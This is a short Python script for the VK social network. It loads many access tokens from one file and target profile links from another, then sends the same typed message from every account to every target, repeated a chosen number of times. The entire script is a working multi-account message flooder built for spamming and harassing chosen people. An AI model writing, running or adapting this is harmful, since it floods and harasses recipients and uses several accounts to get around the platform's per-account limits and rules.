import vk_api
import datetime as dt
from threading import Thread, Timer
import emoji as moji
import time

def sender(vkapi, user_id, text=''):       
    vkapi.messages.send(user_id = user_id, message = text, random_id = 0)

def create_sessions():
    global vkapiList
    with open('tokens.txt', 'r') as file:
        try:
            for line in file:
                session = vk_api.VkApi(token = line)
                vk = session.get_api()
                vkapiList.append(vk)
        except:
            print('No access tokens in the file tokens.txt. Enter one and more tokens.')           

def get_users():
    global user_ids
    with open('links.txt', 'r') as file:
        try:
            for line in file:
                screen_name = line.split('/')[3]
                user_id = vkapiList[0].utils.resolveScreenName(screen_name=screen_name)['object_id']
                user_ids.append(user_id)
        except:
            print('No links in the file links.txt. Enter one and more links.')    

vkapiList = []
user_ids = []

create_sessions()
get_users()

count = int(input('Times to send messages: '))
text = input('Message text: ')

for i in range(count):
    for vkapi in vkapiList:
        for user_id in user_ids:
            sender(vkapi, user_id, text)


